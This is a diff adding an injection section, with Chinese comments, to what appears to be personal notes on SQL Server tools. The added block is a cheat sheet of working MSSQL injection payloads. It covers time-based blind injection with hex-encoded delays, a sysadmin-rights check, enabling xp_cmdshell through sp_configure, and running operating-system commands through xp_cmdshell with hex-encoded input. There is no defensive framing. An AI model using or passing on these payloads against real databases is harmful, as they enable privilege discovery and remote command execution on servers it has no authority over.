@@ -6,6 +6,19 @@
 __工具__
 
 * SQLTools 2.0
+## 注入
+
+```sql
+';declare @x char(9);set @x=0x303a303a35;waitfor delay @x--         # 例如我想执行延时5s，先将'0:0:5'转为十六进制 : 27303a303a3527
+admin';declare @x char(9);if((select IS_SRVROLEMEMBER('sysadmin'))=1) waitfor delay '0:0:5'--   # 判断sa权限
+# 开启xpcmshell：
+admin';declare @x char(9);EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+# 判断开启xpcmdshell:
+admin';declare @x char(9);if((select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')=1) waitfor delay '0:0:4'--
+# 执行命令, 16进制编码一下
+admin';declare @x char(8000);set @x=0x70696e6720312e312e312e31;waitfor exec master..xp_cmdshell @x--
+```
 
 ## SqlServer 2000 在win7x64安装条件
 
